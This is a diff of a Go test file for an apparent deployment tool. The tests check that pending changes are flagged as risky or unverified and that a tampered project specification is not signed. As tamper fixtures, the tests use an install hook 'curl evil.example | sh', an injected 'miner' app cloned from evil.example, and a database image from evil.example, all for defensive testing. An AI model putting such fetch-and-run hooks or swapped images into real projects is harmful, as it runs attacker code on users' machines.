@@ -13,6 +13,7 @@ import (
 	agentv2 "github.com/amalychev/devopus/gen/devopus/agent/v2"
 	"github.com/amalychev/devopus/gen/devopus/agent/v2/agentv2connect"
 	"github.com/amalychev/devopus/internal/agent/paths"
+	"github.com/amalychev/devopus/internal/spec"
 )
 
 // reviewAgent is an agent with a version waiting for the user.
@@ -51,9 +52,9 @@ func TestChanges(t *testing.T) {
 		t.Errorf("accept with nothing pending: %d %s", code, errOut)
 	}
 
-	ag.project.Pending = &agentv2.PendingChange{Version: 5, Hash: "abc", Risky: []string{`apps.api.hooks: — → {Install:curl evil.example | sh}`}, Other: []string{"domain: shop.localhost → shop.test"}}
+	ag.project.Pending = &agentv2.PendingChange{Version: 5, Hash: "abc", Risky: []string{`apps.api.hooks: — → {Install:curl evil.example | sh}`}, Other: []string{"domain: shop.localhost → shop.test"}, Unverified: "the version is not signed"}
 	out := ok(t, "changes")
-	for _, want := range []string{"shop: v4 → v5", "New code on this machine:", "apps.api.hooks", "Also:", "domain: shop.localhost → shop.test", "devopus changes accept <project>"} {
+	for _, want := range []string{"shop: v4 → v5", "Not trusted by itself: the version is not signed.", "New code on this machine:", "apps.api.hooks", "Also:", "domain: shop.localhost → shop.test", "devopus changes accept <project>"} {
 		if !strings.Contains(out, want) {
 			t.Errorf("changes lacks %q:\n%s", want, out)
 		}
@@ -63,5 +64,33 @@ func TestChanges(t *testing.T) {
 	}
 	if out := ok(t, "changes", "accept", "shop"); !strings.Contains(out, "Accepted: shop runs v5") || !ag.got.Accept || ag.got.Hash != "abc" {
 		t.Errorf("accept: %+v\n%s", ag.got, out)
+	}
+}
+
+// A server that slips something into the version gets no signature for it.
+func TestSignOnlyWhatWasSent(t *testing.T) {
+	base, _ := spec.ParseYAML([]byte("name: shop\napps:\n  api:\n    repo: git@x:acme/api.git\nservices:\n  db:\n    type: mysql\n    version: \"8.4\"\n    apps: [api]\n"))
+	sent := []byte("repo: git@x:acme/api.git\ncommand: ./serve\n")
+	honest, _ := base.WithSection("apps.api", sent)
+	if err := sectionIs(base, "apps.api", sent)(honest); err != nil {
+		t.Errorf("honest: %v", err)
+	}
+	for name, tamper := range map[string]func(p *spec.Project){
+		"hook in the same app": func(p *spec.Project) { p.Apps["api"].Hooks = &spec.Hooks{Install: "curl evil.example | sh"} },
+		"another app":          func(p *spec.Project) { p.Apps["miner"] = &spec.App{Repo: "git@evil.example:m.git"} },
+		"a service's image":    func(p *spec.Project) { p.Services["db"].Image = "evil.example/mysql:8.4" },
+	} {
+		got := honest.Clone()
+		tamper(got)
+		if err := sectionIs(base, "apps.api", sent)(got); err == nil {
+			t.Errorf("%s: would be signed", name)
+		}
+	}
+	// Removing an application detaches it, and nothing more.
+	if err := spec.Same(base.WithoutApp("api"), base.WithoutApp("api")); err != nil {
+		t.Error(err)
+	}
+	if err := sectionsKept(base.Apps, base.Services)(honest); err == nil {
+		t.Error("a changed application passes as project settings only")
 	}
 }
